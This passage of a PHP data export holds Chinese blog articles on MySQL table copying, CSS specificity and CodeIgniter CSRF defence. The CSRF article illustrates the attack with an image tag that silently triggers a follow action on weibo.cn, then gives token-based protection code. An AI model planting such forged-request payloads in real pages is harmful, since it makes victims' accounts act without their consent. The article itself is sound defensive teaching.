&nbsp;&nbsp;&nbsp;&nbsp;drop&nbsp;TABLE&nbsp;Table2</pre><h3><span style=\\"padding: 0px; margin: 0px; font-size: 21px; font-family: 宋体;\\">四.是否复制表结构、数据到新表</span></h3><p><span id=\\"OSC_h4_5\\"></span></p><h4><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">1、复制表结构以及数据</span></h4><pre class=\\"brush:sql;toolbar:false\\">CREATE&nbsp;TABLE&nbsp;新表&nbsp;&nbsp;
SELECT&nbsp;*&nbsp;FROM&nbsp;旧表</pre><h4><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">2、只复制表结构</span></h4><p style=\\"margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; white-space: normal; padding: 0px; letter-spacing: 0.5px; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255);\\"><span style=\\"font-size: 12.5px;\\">&nbsp; &nbsp; &nbsp; a、 &nbsp; &nbsp; &nbsp;CREATE TABLE 新表</span><br/></p><p style=\\"margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; white-space: normal; padding: 0px; letter-spacing: 0.5px; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255);\\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;SELECT * FROM 旧表 WHERE 1=2</p><p style=\\"margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; white-space: normal; padding: 0px; letter-spacing: 0.5px; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255);\\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;即:让WHERE条件不成立.<br/>&nbsp; &nbsp; &nbsp; b、:(低版本的mysql不支持，mysql4.0.25 不支持，mysql5已经支持了)<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CREATE TABLE 新表<br/>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LIKE 旧表</p><p><span id=\\"OSC_h4_7\\"></span></p><h4><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">3、复制旧表数据到新表（两表结构一样）</span></h4><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;新表&nbsp;&nbsp;&nbsp;&nbsp;SELECT&nbsp;*&nbsp;FROM&nbsp;旧表</pre><h4><span style=\\"font-size: 14px; font-weight: 600; background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); letter-spacing: 0.5px;\\">4、复制旧表数据到新表（两表结构不一样）</span></h4><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;新表(字段1,字段2,…….)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SELECT&nbsp;字段1,字段2,……&nbsp;FROM&nbsp;旧表</pre><p></p><p>文章转自：http://my.oschina.net/xsh1208/blog/182164</p>',
            'keyword' => 'mysql,复制表数据,select,into,from,insert',
            'sortid' => '4',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:36:28',
          ),
          19 => 
          array (
            'id' => '66',
            'uid' => '1',
            'title' => '[安全] CI的CSRF防范原理及注意事项',
            'content' => '<p>首先我们谈谈什么是CSRF，它就是Cross-Site Request Forgery跨站请求伪造的简称。很多开发者甚至不够重视这个问题，认为这不是安全漏洞，而不过是恶意访问而已，它的攻击原理我在这里简单地描述一下：<br/><br/>有一天你打开你简单优雅逼格十足的谷歌浏览器，首先打开了一个tab页，登录并访问了你的微博首页。我们这里假设weibo.cn有这样一个网址： <a class=\\"gj_safe_a\\" href=\\"http://www.weibo.cn?follow_uid=123\\" target=\\"_blank\\">http://www.weibo.cn?follow_uid=123</a> ，意思是关注id为123的一个用户。这是一个正常的地址，访问也没有问题。<br/>紧接着你的QQ群里发来了一个让你感到好奇的链接，<a class=\\"gj_safe_a\\" href=\\"http://www.comeonbaby.com\\" target=\\"_blank\\">http://www.comeonbaby.com</a>, 你禁不住诱惑打开了这个链接，并在浏览器里的另一个tab页里显示出来。紧接着，你打开你的微博tab页，发现无故关注了一个新的用户。咦，这是为何？<br/><br/>原因很简单，很可能在你打开的<a class=\\"gj_safe_a\\" href=\\"http://www.comeonbaby.com\\" target=\\"_blank\\">http://www.comeonbaby.com</a>链
接里存在着这样一个html元素： &lt;img src=&quot;http://www.weibo.cn?follow_uid=123&quot; alt=&quot;&quot;
 /&gt;, 
浏览器试图加载这个img，很显然加载失败了，因为它不是一个有效的图片格式。但是，这个请求依然被发送出去了，此时你的微博是登录状态中，然后，你就真
的follow了123， 你看，你被强奸了。<br/><br/>这就是简单的csrf攻击。<br/><br/>在实际的网站项目中，如： <a class=\\"gj_safe_a\\" href=\\"http://www.abc.com/logout\\" target=\\"_blank\\">http://www.abc.com/logout</a>之类的链接都应该注意，注销类的、删除内容类的、转账类的都可能中埋伏，轻则让你感到诧异，重则数据丢失，财产损失，所以要重视任何一个对数据有操作行为的url。那么我们在CI里如何解决呢？<br/>简单地：<br/>第一步： 在application/config/config.php里配置以下字段：</p><pre class=\\"brush:php;toolbar:false\\">$config[&#39;csrf_protection&#39;]&nbsp;=&nbsp;true;
$config[&#39;csrf_token_name&#39;]&nbsp;=&nbsp;&#39;csrf_token_name&#39;;
$config[&#39;csrf_cookie_name&#39;]&nbsp;=&nbsp;&#39;csrf_cookie_name&#39;;
$config[&#39;csrf_expire&#39;]&nbsp;=&nbsp;7200;</pre><p>第二步： 在form里使用form_open()，帮助生成一个token。<br/><br/>接下来我说一下csrf的工作原理：<br/><br/>简单地来说，当我们访问一个页面如： <a class=\\"gj_safe_a\\" href=\\"http://www.abc.com/register\\" target=\\"_blank\\">http://www.abc.com/register</a>时，
 
CI会生成一个名为csrf_cookie_name的cookie，其值为hash，并发送到客户端。同时由于你在该页面里使用了
form_open()，会在form标签下生成一个&lt;input type=&quot;hidden&quot; name=&quot;csrf_token_name&quot; 
value=&quot;12uffu2910&quot;/&gt;之类的隐藏字段，其值也为hash。<br/><br/>紧接着用户点击了注册按钮，浏览器将这些数据包括csrf_token_name发送到（post到）服务器，同时也会将名为
csrf_cookie_nam的cookie发送回去。服务器会比较csrf_token_name的值（也就是hash） 与 
csrf_cookie_name 的cookie值（同样也是hash）是否相同， 如果相同则通过，如果不同则说明是csrf攻击。<br/><br/>接下来我们分析一下CI的源代码：<br/><br/>CI在Codeigniter.php里会先加载Security类，接着加载Input类，这两个类在每次访问时都会自动加载的。<br/><br/>先加载 Security类，该类的初始方法首先设置一个hash， 这个hash如果为空，则会在cookie里检查是否存在，如果存在则设为hash；否则会计算出一个新的hash。&nbsp;&nbsp;<br/><br/>接下来开始初始化Input类，导致调用$this-&gt;security-&gt;csrf_verify()方法。该方法首先判断该请求是否为
post请求，如果不是，则会设置一个名为csrf_cookie_name的cookie，其值为hash，如果是post请求，则会用post过来的
csrf_token值与csrf_cookie值比较，比较失败则输出错误；成功则会删除csrf_tookie的值，再次设置csrf_hash的值
（同上，先检查cookie，此时为空，则会新计算一个hash），紧接着又重新赋予了新的csrf_cookie值。<br/><br/>在实际操作过程中， 如有一个register的视图，其页面必然后 form_open()的调用，该方法会产生一个 csrf_token的 hash值， 当post到一个 action时， 该action自然就会执行检查。<br/><br/>由上可以知道：<br/>（1）如果开启了csrf保护，每次调用都会生成一个叫csrf_cookie_name的cookie， 并将值设为hash；<br/>（2）直到遇到一次post请求时才会将以前的cookie删除，重新生成一个hash， 如此反复。<br/><br/>但是，…………<br/><br/>细心的读者可能发现了， 我上文中举的例子是get请求，而CI的csrf只是设计了post请求的防范策略，那么请你想想，你在你的项目中是否存在着 get请求的 资源操作url地址呢？你是否对这样的url地址进行过csrf防范？<br/><br/>我们的建议：<br/>（1）重要的资源操作，都尽量采取post请求，防止csrf攻击；<br/>（2）如果你执意使用get请求，也不是没有办法，原理跟上面也是类似的，比如上文提到的关注账号的操作，你可以设计这样一个地址： <br/><a class=\\"gj_safe_a\\" href=\\"http://www.weibo.cn?follow_uid=123&token=73ksdkfu102\\" target=\\"_blank\\">http://www.weibo.cn?follow_uid=123&amp;token=73ksdkfu102</a> <br/>token是什么？是你随机产生的一个字符串，等用户发送回去后你依然做验证，如果验证通过，则执行后续的关注操作，如果没通过，我们就认为该操作是不合法的。 那个诱惑你的攻击者不可能知道每个人的token， 即使你点击了那个链接，依然不会被认为是有效的访问地址。<br/><br/>一点建议：<br/>由于CI开启csrf保护是全局性的，这样就会导致你的任何post请求都需要加入csrf_token_name的数据字段，的确非常繁琐，有些人索性就关闭了。在这里给出三个解决方法：<br/>（1）每个form里都加入这样一个传递数据：</p><pre class=\\"brush:php;toolbar:false\\">$.post(url,&nbsp;{&#39;&lt;?php&nbsp;echo&nbsp;$this-&gt;security-&gt;get_csrf_token_name();&nbsp;?&gt;&#39;&nbsp;:&nbsp;&#39;&lt;?php&nbsp;echo&nbsp;$this-&gt;security-&gt;get_csrf_hash();&nbsp;?&gt;&#39;},&nbsp;function(){});</pre><p>(2)为ajax请求加入全局传递数据：</p><pre class=\\"brush:php;toolbar:false\\">//
$(function($)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;this&nbsp;script&nbsp;needs&nbsp;to&nbsp;be&nbsp;loaded&nbsp;on&nbsp;every&nbsp;page&nbsp;where&nbsp;an&nbsp;ajax&nbsp;POST&nbsp;may&nbsp;happen
&nbsp;&nbsp;&nbsp;&nbsp;$.ajaxSetup({
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;&lt;?php&nbsp;echo&nbsp;$this-&gt;security-&gt;get_csrf_token_name();&nbsp;?&gt;&#39;&nbsp;:&nbsp;&#39;&lt;?php&nbsp;echo&nbsp;$this-&gt;security-&gt;get_csrf_hash();&nbsp;?&gt;&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;});
&nbsp;&nbsp;//&nbsp;now&nbsp;write&nbsp;your&nbsp;ajax&nbsp;script
});</pre><p>（3）自己写一个helper方法，直接在view中使用，加入隐藏字段，如果你不喜欢使用form_open()的话：</p><pre class=\\"brush:php;toolbar:false\\">function&nbsp;csrf_hidden(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ci&nbsp;=&nbsp;&amp;get_instance();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$name&nbsp;=&nbsp;$ci-&gt;security-&gt;get_csrf_token_name();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$val&nbsp;=&nbsp;$ci-&gt;security-&gt;get_csrf_hash();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&lt;input&nbsp;type=\\\\&quot;hidden\\\\&quot;&nbsp;name=\\\\&quot;$name\\\\&quot;&nbsp;value=\\\\&quot;$val\\\\&quot;&nbsp;/&gt;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p>文章转自：http://codeigniter.org.cn/forums/thread-19849-1-1.html</p>',
            'keyword' => '安全,CI,CSRF',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:20:43',
          ),
          20 => 
          array (
            'id' => '65',
            'uid' => '1',
            'title' => 'CSS 的优先级机制[总结]',
            'content' => '<p><span style=\\"color:#ff0000;font-size:16px\\"><strong>样式的优先级</strong></span></p><p><span style=\\"font-size:16px\\">多重样式（Multiple Styles）：如果外部样式、内部样式和内联样式同时应用于同一个元素，就是使多重样式的情况。 </span> </p><p><span style=\\"font-size:16px\\">一般情况下，优先级如下：</span> </p><p><span style=\\"color:#ff0000;font-size:12px\\">（外部样式）External style sheet &lt;（内部样式）Internal style sheet &lt;（内联样式）Inline style</span></p><p style=\\"line-height: 8px;\\">&nbsp;</p><p><span style=\\"font-size:16px\\">有个例外的情况，就是如果<strong>外部样式</strong>放在<strong>内部样式</strong>的<strong>后面</strong>，则外部样式将覆盖内部样式。</span></p><p><span style=\\"font-size:16px\\">示例如下：</span> </p><table style=\\"border: 0px none; padding: 0px; width: 100%;\\" cellspacing=\\"0\\"><tbody><tr><td><span style=\\"color: #0000ff;\\">&lt;</span><span style=\\"color: #8b0000;\\">head</span><span style=\\"color: #0000ff;\\">&gt;</span></td></tr><tr><td><span style=\\"color: #000000;\\">&nbsp;&nbsp;&nbsp; </span><span style=\\"color: #000000; background-color: #ffff00;\\">&lt;style type=&quot;text/css&quot;&gt;</span></td></tr><tr><td><span style=\\"color: #8b0000;\\">&nbsp;&nbsp;&nbsp; </span><span style=\\"color: #8b0000;\\">&nbsp;</span><span style=\\"color: #8b0000;\\">&nbsp;</span><span style=\\"color: #008000;\\">/*</span><span style=\\"color: #008000;\\">&nbsp;</span><span style=\\"color: #008000;\\">内部样式</span><span style=\\"color: #008000;\\">&nbsp;</span><span style=\\"color: #008000;\\">*/</span></td></tr><tr><td><span style=\\"color: #8b0000;\\">&nbsp;&nbsp;&nbsp; </span><span style=\\"color: #8b0000;\\">&nbsp;</span><span style=\\"color: #8b0000;\\">&nbsp;</span><span style=\\"color: #8b0000;\\">h3</span><span style=\\"color: #8b0000;\\">{</span><span style=\\"color: #ff0000;\\">color</span><span style=\\"color: #0000ff;\\">:</span><span style=\\"color: #0000ff;\\">green</span><span style=\\"color: #0000ff;\\">;</span><span style=\\"color: #8b0000;\\">}</span></td></tr><tr><td><span style=\\"color: #8b0000;\\">&nbsp;&nbsp;&nbsp; </span><span style=\\"color: #000000; background-color: #ffff00;\\">&lt;/style&gt;</span></td></tr><tr><td>&nbsp;</td></tr><tr><td><span style=\\"color: #000000;\\">&nbsp;&nbsp;&nbsp; </span><span style=\\"color: #008000;\\">&lt;!--</span><span style=\\"color: #008000;\\">&nbsp;</span><span style=\\"color: #008000;\\">外部样式</span><span style=\\"color: #008000;\\">&nbsp;</span><span style=\\"color: #008000;\\">style.css</span><span style=\\"color: #008000;\\">&nbsp;</span><span style=\\"color: #008000;\\">--&gt;</span></td></tr><tr><td><span style=\\"color: #000000;\\">&nbsp;&nbsp;&nbsp; </span><span style=\\"color: #0000ff;\\">&lt;</span><span style=\\"color: #8b0000;\\">link</span><span style=\\"color: #ff0000;\\"> rel</span><span style=\\"color: #8b0000;\\">=</span><span style=\\"color: #0000ff;\\">&quot;</span><span style=\\"color: #0000ff;\\">stylesheet</span><span style=\\"color: #0000ff;\\">&quot;</span><span style=\\"color: #ff0000;\\"> type</span><span style=\\"color: #8b0000;\\">=</span><span style=\\"color: #0000ff;\\">&quot;</span><span style=\\"color: #0000ff;\\">text/css</span><span style=\\"color: #0000ff;\\">&quot;</span><span style=\\"color: #ff0000;\\"> href</span><span style=\\"color: #8b0000;\\">=</span><span style=\\"color: #0000ff;\\">&quot;</span><span style=\\"color: #0000ff;\\">style.css</span><span style=\\"color: #0000ff;\\">&quot;</span><span style=\\"color: #8b0000;\\">/</span><span style=\\"color: #0000ff;\\">&gt;</span></td></tr><tr><td><span style=\\"color: #000000;\\">&nbsp;&nbsp;&nbsp; </span><span style=\\"color: #008000;\\">&lt;!--</span><span style=\\"color: #008000;\\">&nbsp;</span><span style=\\"color: #008000;\\">设置：h3{color:blue;}</span><span style=\\"color: #008000;\\">&nbsp;</span><span style=\\"color: #008000;\\">--&gt;</span></td></tr><tr><td><span style=\\"color: #0000ff;\\">&lt;</span><span style=\\"color: #8b0000;\\">/head</span><span style=\\"color: #0000ff;\\">&gt;</span></td></tr><tr><td><span style=\\"color: #0000ff;\\">&lt;</span><span style=\\"color: #8b0000;\\">body</span><span style=\\"color: #0000ff;\\">&gt;</span></td></tr><tr><td><span style=\\"color: #000000;\\">&nbsp;</span><span style=\\"color: #000000;\\">&nbsp;</span><span style=\\"color: #000000;\\">&nbsp;</span><span style=\\"color: #000000;\\">&nbsp;</span><span style=\\"color: #0000ff;\\">&lt;</span><span style=\\"color: #8b0000;\\">h3</span><span style=\\"color: #0000ff;\\">&gt;</span><span style=\\"color: #000000;\\">测试！</span><span style=\\"color: #0000ff;\\">&lt;</span><span style=\\"color: #8b0000;\\">/h3</span><span style=\\"color: #0000ff;\\">&gt;</span></td></tr><tr><td><span style=\\"color: #0000ff;\\">&lt;</span><span style=\\"color: #8b0000;\\">/body</span><span style=\\"color: #0000ff;\\">&gt;</span></td></tr></tbody></table><p style=\\"line-height: 40px;\\">&nbsp;</p><p><span style=\\"color:#ff0000;font-size:16px\\"><strong>选择器的优先权</strong></span></p><p style=\\"line-height: 2px;\\">&nbsp;</p><p><a href=\\"http://images.cnblogs.com/cnblogs_com/xugang/WindowsLiveWriter/CSS_148B3/jc6_002_2.png\\"><img title=\\"jc6_002\\" style=\\"border: 0px none; display: inline;\\" alt=\\"jc6_002\\" src=\\"http://images.cnblogs.com/cnblogs_com/xugang/WindowsLiveWriter/CSS_148B3/jc6_002_thumb.png\\" height=\\"135\\" border=\\"0\\" width=\\"535\\"/></a> </p><p style=\\"line-height: 10px;\\">&nbsp;</p><p><strong><span style=\\"color:#ff0000;font-size:16px\\">解释：</span></strong></p><p><span style=\\"font-size:16px\\">1.&nbsp; 内联样式表的权值最高 1000；</span></p><p><span style=\\"font-size:16px\\">2.&nbsp; ID 选择器的权值为 100</span></p><p><span style=\\"font-size:16px\\">3.&nbsp; Class 类选择器的权值为 10</span></p><p><span style=\\"font-size:16px\\">4.&nbsp; HTML 标签选择器的权值为 1</span> </p><p style=\\"line-height: 10px;\\">&nbsp;</p><p><span style=\\"font-size:16px\\">利用选择器的权值进行计算比较，示例如下：</span></p><pre class=\\"brush:html;toolbar:false\\">&lt;html&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;head&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;style&nbsp;type=&quot;text/css&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#redP&nbsp;p&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;权值&nbsp;=&nbsp;100+1=101&nbsp;*/&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;color:#F00;&nbsp;&nbsp;/*&nbsp;红色&nbsp;*/&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#redP&nbsp;.red&nbsp;em&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;权值&nbsp;=&nbsp;100+10+1=111&nbsp;*/&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;color:#00F;&nbsp;/*&nbsp;蓝色&nbsp;*/&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#redP&nbsp;p&nbsp;span&nbsp;em&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;权值&nbsp;=&nbsp;100+1+1+1=103&nbsp;*/&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;color:#FF0;/*黄色*/&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/style&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;/head&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;body&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div&nbsp;id=&quot;redP&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p&nbsp;class=&quot;red&quot;&gt;red&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;span&gt;&lt;em&gt;em&nbsp;red&lt;/em&gt;&lt;/span&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/p&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;red&lt;/p&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;/body&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&lt;/html&gt;</pre><p><strong>结果</strong>：<span style=\\"color: #0000ff;\\">&lt;</span><span style=\\"color: #8b0000;\\">em</span><span style=\\"color: #0000ff;\\">&gt; </span>标签内的数据显示为蓝色。</p><p>&nbsp;</p><p><span style=\\"font-size:16px\\"><span style=\\"color:#ff0000\\"><strong>CSS </strong><strong>优先级法则：</strong></span></span></p><p><span style=\\"font-size:16px\\">A&nbsp; 选择器都有一个权值，权值越大越优先；</span></p><p><span style=\\"font-size:16px\\">B&nbsp; 当权值相等时，后出现的样式表设置要优于先出现的样式表设置；</span></p><p><span style=\\"font-size:16px\\">C&nbsp; 创作者的规则高于浏览者：即网页编写者设置的CSS 样式的优先权高于浏览器所设置的样式；</span></p><p><span style=\\"font-size:16px\\">D&nbsp; 继承的CSS 样式不如后来指定的CSS 样式；</span></p><p><span style=\\"font-size:16px\\">E&nbsp; 在同一组属性设置中标有<span style=\\"color:#ff0000\\"><span style=\\"color:#000000\\">“</span>!important</span>”规则的优先级最大；示例如下：</span></p><pre class=\\"brush:html;toolbar:false\\">&lt;html&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;head&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;style&nbsp;type=&quot;text/css&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#redP&nbsp;p{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*两个color属性在同一组*/&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;color:#00f&nbsp;!important;&nbsp;/*&nbsp;优先级最大&nbsp;*/&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;color:#f00;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/style&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;/head&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;body&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div&nbsp;id=&quot;redP&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;color&lt;/p&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;color&lt;/p&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;/body&gt;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/html&gt;</pre><p><strong>结果</strong>：在Firefox 下显示为<strong>蓝色</strong>；在IE&nbsp; 6 下显示为<strong>红色</strong>；</p><p style=\\"line-height: 35px;\\">&nbsp;</p><p><strong><span style=\\"color:#ff0000;font-size:16px\\">使用脚本添加样式</span></strong></p><p><span style=\\"font-size:16px\\">当在连接外部样式后，再在其后面使用JavaScript 脚本插入内部样式时（即内部样式使用脚本创建），IE 浏览器就表现出它的另类了。</span><span style=\\"font-size:16px\\">代码如下：</span></p><pre class=\\"brush:html;toolbar:false\\">&lt;html&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&lt;head&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;title&gt;&nbsp;demo&nbsp;&lt;/title&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;meta&nbsp;name=&quot;Author&quot;&nbsp;content=&quot;xugang&quot;&nbsp;/&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;!--&nbsp;添加外部CSS&nbsp;样式&nbsp;--&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;link&nbsp;rel=&quot;stylesheet&quot;&nbsp;href=&quot;styles.css&quot;&nbsp;type=&quot;text/css&quot;&nbsp;/&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;!--&nbsp;在外部的styles.css文件中，代码如下：&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h3&nbsp;{color:blue;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;--&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;!--&nbsp;使用javascript&nbsp;创建内部CSS&nbsp;样式&nbsp;--&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;!--&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;(function(){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;agent&nbsp;=&nbsp;window.navigator.userAgent.toLowerCase();&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;is_op&nbsp;=&nbsp;(agent.indexOf(&quot;opera&quot;)&nbsp;!=&nbsp;-1);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;is_ie&nbsp;=&nbsp;(agent.indexOf(&quot;msie&quot;)&nbsp;!=&nbsp;-1)&nbsp;&amp;&amp;&nbsp;document.all&nbsp;&amp;&amp;&nbsp;!is_op;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;is_ch&nbsp;=&nbsp;(agent.indexOf(&quot;chrome&quot;)&nbsp;!=&nbsp;-1);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;cssStr=&quot;h3&nbsp;{color:green;}&quot;;&nbsp;&nbsp;&nbsp;&nbsp;
